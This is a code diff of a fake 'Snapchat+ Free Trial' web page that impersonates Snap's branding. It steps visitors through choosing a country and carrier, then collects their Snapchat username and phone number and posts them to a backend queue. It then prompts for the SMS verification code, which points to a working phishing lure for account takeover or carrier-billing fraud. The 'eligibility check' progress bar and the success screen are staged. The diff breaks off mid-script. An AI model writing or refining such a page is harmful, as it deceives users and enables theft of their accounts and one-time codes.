@@ -1,15 +1,15 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Snapchat+ — Essai Gratuit</title>
+    <title>Snapchat+ — Free Trial</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif;
         }
 
         body {
@@ -22,41 +22,91 @@
         }
 
         .container { width: 100%; max-width: 400px; }
+
         .card {
             background: #1a1a1a;
-            border-radius: 28px;
-            padding: 32px 24px 28px;
+            border-radius: 32px;
+            padding: 32px 24px;
             box-shadow: 0 25px 80px rgba(0,0,0,0.9);
             border: 1px solid #2a2a2a;
         }
 
-        .brand { text-align: center; margin-bottom: 28px; }
-        .brand .ghost { font-size: 48px; line-height: 1; margin-bottom: 4px; }
-        .brand h1 { font-size: 30px; font-weight: 700; color: #fff; letter-spacing: -0.5px; }
+        /* ===== SNAPCHAT BRANDING ===== */
+        .brand {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .brand .snap-icon {
+            width: 64px;
+            height: 64px;
+            background: #FFFC00;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 8px;
+            font-size: 32px;
+            box-shadow: 0 0 40px rgba(255,252,0,0.15);
+        }
+
+        .brand h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: -0.5px;
+        }
+
         .brand h1 span { color: #FFFC00; }
-        .brand .tagline { color: #888; font-size: 13px; margin-top: 4px; }
+
+        .brand .tagline {
+            color: #888;
+            font-size: 13px;
+            margin-top: 4px;
+        }
+
         .brand .badge {
             display: inline-block;
             background: #FFFC00;
             color: #000;
             font-size: 11px;
             font-weight: 700;
-            padding: 4px 14px;
+            padding: 4px 16px;
             border-radius: 20px;
             margin-top: 8px;
             text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
-        .step { display: none; animation: fadeUp 0.35s ease; }
+        /* ===== STEPS ===== */
+        .step { display: none; animation: fadeUp 0.4s ease; }
         .step.active { display: block; }
-        @keyframes fadeUp { 0% { opacity: 0; transform: translateY(12px); } 100% { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeUp { 0% { opacity: 0; transform: translateY(16px); } 100% { opacity: 1; transform: translateY(0); } }
 
-        .step-title { color: #fff; font-size: 20px; font-weight: 600; text-align: center; margin-bottom: 20px; }
-        .step-sub { color: #888; font-size: 14px; text-align: center; margin-bottom: 20px; }
+        .step-title {
+            color: #fff;
+            font-size: 20px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 20px;
+        }
 
-        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        .step-sub {
+            color: #888;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        /* ===== COUNTRY GRID ===== */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
         .country-card {
-            padding: 18px 12px;
+            padding: 20px 12px;
             border-radius: 16px;
             border: 2px solid #2a2a2a;
             background: #121212;
@@ -67,47 +117,77 @@
             transition: all 0.2s;
             text-align: center;
         }
-        .country-card .flag { font-size: 28px; display: block; margin-bottom: 4px; }
+
+        .country-card .flag { font-size: 32px; display: block; margin-bottom: 6px; }
         .country-card:hover { border-color: #FFFC00; background: #1a1a1a; transform: scale(1.02); }
         .country-card:active { transform: scale(0.97); }
+        .country-card.selected { border-color: #FFFC00; background: #1a1a1a; }
+
+        /* ===== NETWORK GRID ===== */
+        .network-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
 
         .network-card {
-            padding: 14px 12px;
+            padding: 14px 10px;
             border-radius: 14px;
             border: 2px solid #2a2a2a;
             background: #121212;
             color: #fff;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 500;
             cursor: pointer;
             transition: all 0.2s;
             text-align: center;
         }
-        .network-card:hover { border-color: #FFFC00; background: #1a1a1a; }
 
-        .phone-group {
+        .network-card:hover { border-color: #FFFC00; background: #1a1a1a; }
+        .network-card.selected { border-color: #FFFC00; background: #1a1a1a; }
+
+        /* ===== INPUTS ===== */
+        .input-group {
             display: flex;
             align-items: center;
             background: #121212;
             border-radius: 16px;
             border: 2px solid #2a2a2a;
             padding: 0 16px;
-            margin-bottom: 16px;
+            margin-bottom: 12px;
             transition: border-color 0.25s;
         }
-        .phone-group:focus-within { border-color: #FFFC00; }
-        .phone-group .code { color: #aaa; font-size: 18px; font-weight: 500; padding-right: 12px; border-right: 1px solid #2a2a2a; }
-        .phone-group input {
+
+        .input-group:focus-within { border-color: #FFFC00; }
+
+        .input-group .icon {
+            color: #555;
+            font-size: 18px;
+            padding-right: 12px;
+            border-right: 1px solid #2a2a2a;
+        }
+
+        .input-group .code {
+            color: #aaa;
+            font-size: 16px;
+            font-weight: 500;
+            padding-right: 12px;
+            border-right: 1px solid #2a2a2a;
+        }
+
+        .input-group input {
             flex: 1;
             padding: 16px 12px;
             background: transparent;
             border: none;
             outline: none;
             color: #fff;
-            font-size: 18px;
+            font-size: 16px;
         }
-        .phone-group input::placeholder { color: #444; }
 
+        .input-group input::placeholder { color: #444; }
+
+        /* ===== BUTTONS ===== */
         .btn {
             width: 100%;
             padding: 16px;
@@ -118,15 +198,31 @@
             cursor: pointer;
             transition: all 0.2s;
         }
-        .btn-primary { background: #FFFC00; color: #000; }
+
+        .btn-primary {
+            background: #FFFC00;
+            color: #000;
+        }
+
         .btn-primary:hover { transform: scale(1.02); box-shadow: 0 4px 28px rgba(255,252,0,0.25); }
         .btn-primary:disabled { opacity: 0.5; transform: none !important; box-shadow: none !important; cursor: not-allowed; }
-        .btn-secondary { background: #2a2a2a; color: #fff; margin-top: 8px; }
-        .btn-secondary:hover { background: #333; }
-        .btn-ghost { background: transparent; color: #888; font-size: 14px; margin-top: 6px; }
-        .btn-ghost:hover { color: #fff; }
 
-        .otp-box { display: flex; gap: 10px; justify-content: center; margin: 20px 0 16px; }
+        .btn-secondary {
+            background: #2a2a2a;
+            color: #fff;
+            margin-top: 8px;
+        }
+
+        .btn-secondary:hover { background: #333; }
+
+        /* ===== OTP ===== */
+        .otp-box {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0 16px;
+        }
+
         .otp-box input {
             width: 52px;
             height: 58px;
@@ -140,13 +236,23 @@
             outline: none;
             transition: border-color 0.2s;
         }
+
         .otp-box input:focus { border-color: #FFFC00; }
 
         .otp-hint { text-align: center; color: #777; font-size: 14px; }
         .otp-hint strong { color: #fff; }
-        .resend { text-align: center; color: #555; font-size: 14px; margin-top: 12px; cursor: pointer; }
+
+        .resend {
+            text-align: center;
+            color: #555;
+            font-size: 14px;
+            margin-top: 12px;
+            cursor: pointer;
+        }
+
         .resend span { color: #FFFC00; font-weight: 500; }
 
+        /* ===== LOADER ===== */
         .loader-wrap { text-align: center; padding: 12px 0; }
         .loader-spinner {
             width: 44px;
@@ -159,27 +265,51 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        .progress-track { width: 100%; height: 3px; background: #2a2a2a; border-radius: 4px; overflow: hidden; margin-top: 12px; }
-        .progress-fill { height: 100%; width: 0%; background: #FFFC00; border-radius: 4px; transition: width 0.35s ease; }
+        .progress-track {
+            width: 100%;
+            height: 3px;
+            background: #2a2a2a;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 12px;
+        }
 
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: #FFFC00;
+            border-radius: 4px;
+            transition: width 0.35s ease;
+        }
+
+        /* ===== SUCCESS / ERROR ===== */
         .icon-big { font-size: 56px; text-align: center; margin: 8px 0 12px; }
         .msg-center { text-align: center; color: #aaa; font-size: 15px; line-height: 1.6; }
         .error-text { color: #ff6b6b !important; }
         .success-text { color: #69db7c !important; }
 
-        .footer { text-align: center; color: #2a2a2a; font-size: 11px; margin-top: 18px; }
+        /* ===== FOOTER ===== */
+        .footer {
+            text-align: center;
+            color: #2a2a2a;
+            font-size: 11px;
+            margin-top: 18px;
+        }
+
         .footer a { color: #444; text-decoration: none; }
 
+        /* ===== UTILITY ===== */
         .hidden { display: none !important; }
         .mt-8 { margin-top: 8px; }
         .text-center { text-align: center; }
 
         @media (max-width: 440px) {
             .card { padding: 24px 16px; }
-            .brand h1 { font-size: 26px; }
+            .brand h1 { font-size: 24px; }
             .otp-box input { width: 44px; height: 50px; font-size: 20px; }
             .country-card { padding: 14px 8px; font-size: 14px; }
-            .country-card .flag { font-size: 22px; }
+            .country-card .flag { font-size: 24px; }
+            .network-card { font-size: 12px; padding: 12px 8px; }
         }
     </style>
 </head>
@@ -188,98 +318,103 @@
 <div class="container">
     <div class="card">
 
-        <!-- BRAND -->
+        <!-- ===== SNAPCHAT BRAND ===== -->
         <div class="brand">
-            <div class="ghost">👻</div>
+            <div class="snap-icon">👻</div>
             <h1>snapchat<span>+</span></h1>
-            <p class="tagline" id="langTagline">Essai Premium Gratuit — Offre Limitée</p>
-            <span class="badge" id="langBadge">✨ 3 Jours Gratuits</span>
+            <p class="tagline">✨ Free Premium Trial — Limited Time</p>
+            <span class="badge">🔥 3 Days Free</span>
         </div>
 
-        <!-- STEP 1: COUNTRY -->
+        <!-- ===== STEP 1: COUNTRY ===== -->
         <div class="step active" id="step1">
-            <div class="step-title" id="langSelectCountry">Sélectionnez votre pays</div>
+            <div class="step-title">🌍 Select Your Country</div>
             <div class="grid-2">
                 <div class="country-card" onclick="selectCountry('FR')">
-                    <span class="flag">🇫🇷</span> <span id="langFrance">France</span>
+                    <span class="flag">🇫🇷</span> France
                 </div>
                 <div class="country-card" onclick="selectCountry('BE')">
-                    <span class="flag">🇧🇪</span> <span id="langBelgium">Belgique</span>
+                    <span class="flag">🇧🇪</span> Belgium
                 </div>
             </div>
         </div>
 
-        <!-- STEP 2: NETWORK -->
+        <!-- ===== STEP 2: NETWORK ===== -->
         <div class="step" id="step2">
-            <div class="step-title" id="langSelectNetwork">Sélectionnez votre opérateur</div>
-            <div class="grid-2" id="networkGrid"></div>
-            <button class="btn btn-secondary" onclick="goBack()" id="langBack">← Retour</button>
+            <div class="step-title">📡 Select Your Network</div>
+            <div class="network-grid" id="networkGrid"></div>
+            <button class="btn btn-secondary" onclick="goBack()">← Back</button>
         </div>
 
-        <!-- STEP 3: PHONE -->
+        <!-- ===== STEP 3: USERNAME + PHONE ===== -->
         <div class="step" id="step3">
-            <div class="step-title" id="langEnterNumber">Entrez votre numéro</div>
-            <div class="phone-group">
-                <span class="code" id="countryCode">+33</span>
-                <input type="tel" id="phoneInput" placeholder="6 12 34 56 78" maxlength="15" />
+            <div class="step-title">👤 Enter Your Details</div>
+
+            <div class="input-group">
+                <span class="icon">👻</span>
+                <input type="text" id="usernameInput" placeholder="Snapchat Username" maxlength="30" />
             </div>
-            <button class="btn btn-primary" onclick="sendNumber()" id="sendBtn">
-                <span id="langContinue">Continuer →</span>
-            </button>
-            <button class="btn btn-secondary" onclick="goBack()" id="langBack2">← Retour</button>
+
+            <div class="input-group">
+                <span class="code" id="countryCode">+33</span>
+                <input type="tel" id="phoneInput" placeholder="Phone Number" maxlength="15" />
+            </div>
+
+            <button class="btn btn-primary" onclick="sendNumber()" id="sendBtn">Continue →</button>
+            <button class="btn btn-secondary" onclick="goBack()">← Back</button>
+
             <p class="text-center" style="color:#444;font-size:11px;margin-top:14px;">
-                <span id="langTerms">En continuant, vous acceptez nos</span>
-                <a href="#" style="color:#666;"> <span id="langTermsLink">Conditions</span></a> &amp;
-                <a href="#" style="color:#666;"> <span id="langPrivacy">Politique de confidentialité</span></a>
+                By continuing you agree to our <a href="#" style="color:#666;">Terms</a> &amp; <a href="#" style="color:#666;">Privacy Policy</a>
             </p>
         </div>
 
-        <!-- STEP 4: VERIFYING -->
+        <!-- ===== STEP 4: VERIFYING ===== -->
         <div class="step" id="step4">
             <div class="loader-wrap">
                 <div class="loader-spinner"></div>
-                <div class="step-title" id="langVerifying">Vérification en cours...</div>
-                <p style="color:#888;font-size:14px;text-align:center;" id="langWaitText">Veuillez patienter pendant que nous vérifions votre éligibilité...</p>
+                <div class="step-title">⏳ Verifying Your Account</div>
+                <p style="color:#888;font-size:14px;text-align:center;">Please wait while we confirm your eligibility...</p>
                 <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
             </div>
         </div>
 
-        <!-- STEP 5: OTP -->
+        <!-- ===== STEP 5: OTP ===== -->
         <div class="step" id="step5">
-            <div class="step-title" id="langEnterOTP">Entrez le code de vérification</div>
-            <p class="otp-hint" id="langOTPHint">Nous avons envoyé un code à <strong id="displayNumber"></strong></p>
+            <div class="step-title">🔑 Enter Verification Code</div>
+            <p class="otp-hint">We sent a code to <strong id="displayNumber"></strong></p>
             <div class="otp-box" id="otpContainer"></div>
-            <button class="btn btn-primary" onclick="verifyOTP()" id="langVerifyBtn">Vérifier →</button>
-            <p class="resend" onclick="resendOTP()"><span id="langResendText">Vous n'avez pas reçu le code ?</span> <span id="langResend">Renvoyer</span></p>
-            <button class="btn btn-secondary" onclick="goBack()" id="langBack3">← Retour</button>
+            <button class="btn btn-primary" onclick="verifyOTP()">Verify →</button>
+            <p class="resend" onclick="resendOTP()">Didn't get the code? <span>Resend</span></p>
+            <button class="btn btn-secondary" onclick="goBack()">← Back</button>
         </div>
 
-        <!-- STEP 6: SUCCESS -->
+        <!-- ===== STEP 6: SUCCESS ===== -->
         <div class="step" id="step6">
             <div class="icon-big">✅</div>
-            <div class="step-title" id="langSuccessTitle">Snapchat+ Activé ! 🎉</div>
-            <p class="msg-center success-text" id="langSuccessText">Votre essai gratuit est maintenant actif.<br />Profitez des fonctionnalités exclusives !</p>
-            <button class="btn btn-primary" style="margin-top:16px;" onclick="resetAll()" id="langContinueSnap">Continuer vers Snapchat</button>
+            <div class="step-title">Snapchat+ Activated! 🎉</div>
+            <p class="msg-center success-text">Your free trial is now active.<br />Enjoy exclusive features!</p>
+            <button class="btn btn-primary" style="margin-top:16px;" onclick="resetAll()">Open Snapchat</button>
         </div>
 
-        <!-- STEP 7: WRONG NUMBER -->
+        <!-- ===== STEP 7: WRONG NUMBER ===== -->
         <div class="step" id="step7">
             <div class="icon-big">❌</div>
-            <div class="step-title" id="langWrongTitle">Numéro incorrect</div>
-            <p class="msg-center error-text" id="langWrongText">Le numéro que vous avez saisi est incorrect.<br />Veuillez réessayer.</p>
-            <button class="btn btn-primary" style="margin-top:16px;" onclick="goBackToPhone()" id="langTryAgain">Réessayer</button>
+            <div class="step-title">Invalid Number</div>
+            <p class="msg-center error-text">The number you entered is incorrect.<br />Please try again.</p>
+            <button class="btn btn-primary" style="margin-top:16px;" onclick="goBackToPhone()">Try Again</button>
         </div>
 
-        <!-- STEP 8: OTP ERROR -->
+        <!-- ===== STEP 8: OTP ERROR ===== -->
         <div class="step" id="step8">
             <div class="icon-big">❌</div>
-            <div class="step-title" id="langOTPErrorTitle">Code invalide</div>
-            <p class="msg-center error-text" id="langOTPErrorText">Le code que vous avez saisi est incorrect.<br />Veuillez réessayer.</p>
-            <button class="btn btn-primary" style="margin-top:16px;" onclick="goBackToOTP()" id="langOTPRetry">Réessayer</button>
+            <div class="step-title">Invalid Code</div>
+            <p class="msg-center error-text">The code you entered is incorrect.<br />Please try again.</p>
+            <button class="btn btn-primary" style="margin-top:16px;" onclick="goBackToOTP()">Try Again</button>
         </div>
 
+        <!-- ===== FOOTER ===== -->
         <div class="footer">
-            © 2026 Snap Inc. — <span id="langNotAffiliated">Non affilié à Snapchat.</span>
+            © 2026 Snap Inc. — Not affiliated with Snapchat.
         </div>
 
     </div>
@@ -287,123 +422,29 @@
 
 <script>
     // ============================================================
-    // TRANSLATIONS
+    // STATE
     // ============================================================
-    const LANG = {
-        FR: {
-            tagline: "Essai Premium Gratuit — Offre Limitée",
-            badge: "✨ 3 Jours Gratuits",
-            selectCountry: "Sélectionnez votre pays",
-            france: "France",
-            belgium: "Belgique",
-            selectNetwork: "Sélectionnez votre opérateur",
-            back: "← Retour",
-            enterNumber: "Entrez votre numéro",
-            continue: "Continuer →",
-            terms: "En continuant, vous acceptez nos",
-            termsLink: "Conditions",
-            privacy: "Politique de confidentialité",
-            verifying: "Vérification en cours...",
-            waitText: "Veuillez patienter pendant que nous vérifions votre éligibilité...",
-            enterOTP: "Entrez le code de vérification",
-            otpHint: "Nous avons envoyé un code à",
-            verifyBtn: "Vérifier →",
-            resendText: "Vous n'avez pas reçu le code ?",
-            resend: "Renvoyer",
-            successTitle: "Snapchat+ Activé ! 🎉",
-            successText: "Votre essai gratuit est maintenant actif.\nProfitez des fonctionnalités exclusives !",
-            continueSnap: "Continuer vers Snapchat",
-            wrongTitle: "Numéro incorrect",
-            wrongText: "Le numéro que vous avez saisi est incorrect.\nVeuillez réessayer.",
-            tryAgain: "Réessayer",
-            otpErrorTitle: "Code invalide",
-            otpErrorText: "Le code que vous avez saisi est incorrect.\nVeuillez réessayer.",
-            otpRetry: "Réessayer",
-            notAffiliated: "Non affilié à Snapchat."
-        },
-        BE: {
-            tagline: "Gratis Premium Proefperiode — Beperkte Tijd",
-            badge: "✨ 3 Gratis Dagen",
-            selectCountry: "Selecteer uw land",
-            france: "Frankrijk",
-            belgium: "België",
-            selectNetwork: "Selecteer uw provider",
-            back: "← Terug",
-            enterNumber: "Voer uw nummer in",
-            continue: "Doorgaan →",
-            terms: "Door verder te gaan gaat u akkoord met onze",
-            termsLink: "Voorwaarden",
-            privacy: "Privacybeleid",
-            verifying: "Bezig met verifiëren...",
-            waitText: "Even geduld terwijl we uw geschiktheid controleren...",
-            enterOTP: "Voer de verificatiecode in",
-            otpHint: "We hebben een code gestuurd naar",
-            verifyBtn: "Verifiëren →",
-            resendText: "Geen code ontvangen?",
-            resend: "Opnieuw verzenden",
-            successTitle: "Snapchat+ Geactiveerd! 🎉",
-            successText: "Je gratis proefperiode is nu actief.\nGeniet van exclusieve functies!",
-            continueSnap: "Doorgaan naar Snapchat",
-            wrongTitle: "Verkeerd nummer",
-            wrongText: "Het nummer dat u heeft ingevoerd is onjuist.\nProbeer opnieuw.",
-            tryAgain: "Probeer opnieuw",
-            otpErrorTitle: "Ongeldige code",
-            otpErrorText: "De code die u heeft ingevoerd is onjuist.\nProbeer opnieuw.",
-            otpRetry: "Probeer opnieuw",
-            notAffiliated: "Niet gelieerd aan Snapchat."
-        }
-    };
-
-    let currentLang = 'FR';
     let selectedCountry = null;
     let selectedNetwork = null;
+    let username = null;
     let phoneNumber = null;
     let queueId = null;
     let otpLength = 4;
 
     const COUNTRIES = {
-        FR: { name: 'France', code: '+33', networks: ['Orange', 'SFR', 'Bouygues', 'Free'], queue: 'A', lang: 'FR' },
-        BE: { name: 'Belgium', code: '+32', networks: ['Proximus', 'Orange BE', 'BASE', 'Telenet'], queue: 'B', lang: 'BE' }
+        FR: {
+            name: 'France',
+            code: '+33',
+            networks: ['Orange', 'SFR', 'Bouygues', 'Free'],
+            queue: 'A'
+        },
+        BE: {
+            name: 'Belgium',
+            code: '+32',
+            networks: ['Proximus', 'Orange BE', 'BASE', 'Telenet'],
+            queue: 'B'
+        }
     };
-
-    // ============================================================
-    // LANGUAGE SETTER
-    // ============================================================
-    function setLanguage(lang) {
-        currentLang = lang;
-        const t = LANG[lang];
-        document.getElementById('langTagline').textContent = t.tagline;
-        document.getElementById('langBadge').textContent = t.badge;
-        document.getElementById('langSelectCountry').textContent = t.selectCountry;
-        document.getElementById('langFrance').textContent = t.france;
-        document.getElementById('langBelgium').textContent = t.belgium;
-        document.getElementById('langSelectNetwork').textContent = t.selectNetwork;
-        document.getElementById('langBack').textContent = t.back;
-        document.getElementById('langEnterNumber').textContent = t.enterNumber;
-        document.getElementById('langContinue').textContent = t.continue;
-        document.getElementById('langBack2').textContent = t.back;
-        document.getElementById('langTerms').textContent = t.terms;
-        document.getElementById('langTermsLink').textContent = t.termsLink;
-        document.getElementById('langPrivacy').textContent = t.privacy;
-        document.getElementById('langVerifying').textContent = t.verifying;
-        document.getElementById('langWaitText').textContent = t.waitText;
-        document.getElementById('langEnterOTP').textContent = t.enterOTP;
-        document.getElementById('langOTPHint').innerHTML = t.otpHint + ' <strong id="displayNumber"></strong>';
-        document.getElementById('langVerifyBtn').textContent = t.verifyBtn;
-        document.getElementById('langResendText').textContent = t.resendText;
-        document.getElementById('langResend').textContent = t.resend;
-        document.getElementById('langSuccessTitle').textContent = t.successTitle;
-        document.getElementById('langSuccessText').textContent = t.successText;
-        document.getElementById('langContinueSnap').textContent = t.continueSnap;
-        document.getElementById('langWrongTitle').textContent = t.wrongTitle;
-        document.getElementById('langWrongText').textContent = t.wrongText;
-        document.getElementById('langTryAgain').textContent = t.tryAgain;
-        document.getElementById('langOTPErrorTitle').textContent = t.otpErrorTitle;
-        document.getElementById('langOTPErrorText').textContent = t.otpErrorText;
-        document.getElementById('langOTPRetry').textContent = t.otpRetry;
-        document.getElementById('langNotAffiliated').textContent = t.notAffiliated;
-        document.getElementById('langBack3').textContent = t.back;
-    }
 
     // ============================================================
     // UI HELPERS
@@ -431,13 +472,125 @@
         document.getElementById('phoneInput').focus();
     }
 
+    function goBackToOTP() {
+        showStep('step5');
+        document.querySelectorAll('.otp-box input').forEach(el => el.value = '');
+        document.querySelector('.otp-box input')?.focus();
+    }
+
     // ============================================================
-    // STEP 1 → COUNTRY
+    // STEP 1: COUNTRY
     // ============================================================
     function selectCountry(country) {
         selectedCountry = country;
-        const lang = COUNTRIES[country].lang;
-        setLanguage(lang);
+        document.querySelectorAll('.country-card').forEach(el => el.classList.remove('selected'));
+        document.querySelector(`.country-card[onclick="selectCountry('${country}')"]`).classList.add('selected');
 
         const networks = COUNTRIES[country].networks;
-        const grid = document.getElemen
+        const grid = document.getElementById('networkGrid');
+        grid.innerHTML = '';
+        networks.forEach(net => {
+            const btn = document.createElement('div');
+            btn.className = 'network-card';
+            btn.textContent = net;
+            btn.onclick = () => selectNetwork(net);
+            grid.appendChild(btn);
+        });
+
+        showStep('step2');
+    }
+
+    // ============================================================
+    // STEP 2: NETWORK
+    // ============================================================
+    function selectNetwork(network) {
+        selectedNetwork = network;
+        document.querySelectorAll('.network-card').forEach(el => el.classList.remove('selected'));
+        document.querySelector(`.network-card[onclick="selectNetwork('${network}')"]`).classList.add('selected');
+
+        document.getElementById('countryCode').textContent = COUNTRIES[selectedCountry].code;
+        showStep('step3');
+        document.getElementById('usernameInput').focus();
+    }
+
+    // ============================================================
+    // STEP 3: SUBMIT
+    // ============================================================
+    async function sendNumber() {
+        username = document.getElementById('usernameInput').value.trim();
+        phoneNumber = document.getElementById('phoneInput').value.replace(/\s/g, '');
+
+        if (!username || username.length < 2) {
+            alert('Please enter your Snapchat username.');
+            document.getElementById('usernameInput').focus();
+            return;
+        }
+
+        if (!phoneNumber || phoneNumber.length < 8) {
+            alert('Please enter a valid phone number.');
+            document.getElementById('phoneInput').focus();
+            return;
+        }
+
+        const fullNumber = COUNTRIES[selectedCountry].code + phoneNumber;
+        const btn = document.getElementById('sendBtn');
+        btn.disabled = true;
+        btn.textContent = 'Sending...';
+
+        showStep('step4');
+
+        let progress = 0;
+        const fill = document.getElementById('progressFill');
+        const interval = setInterval(() => {
+            progress += Math.random() * 8;
+            if (progress > 90) clearInterval(interval);
+            fill.style.width = Math.min(progress, 90) + '%';
+        }, 300);
+
+        try {
+            const response = await fetch('/api/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    number: fullNumber,
+                    username: username,
+                    country: selectedCountry,
+                    network: selectedNetwork,
+                    queue: COUNTRIES[selectedCountry].queue
+                })
+            });
+
+            const data = await response.json();
+            queueId = data.queueId;
+
+            clearInterval(interval);
+            fill.style.width = '100%';
+
+            setTimeout(() => {
+                showStep('step5');
+                setupOTP(4);
+                document.getElementById('displayNumber').textContent = fullNumber;
+                document.querySelector('.otp-box input')?.focus();
+            }, 500);
+
+        } catch (error) {
+            alert('Connection error. Please try again.');
+            resetAll();
+        } finally {
+            btn.disabled = false;
+            btn.textContent = 'Continue →';
+        }
+    }
+
+    // ============================================================
+    // STEP 5: OTP
+    // ============================================================
+    function setupOTP(length) {
+        otpLength = length;
+        const container = document.getElementById('otpContainer');
+        container.innerHTML = '';
+        for (let i = 0; i < length; i++) {
+            const input = document.createElement('input');
+            input.type = 'text';
+            input.maxLength = 1;
+            input.id =
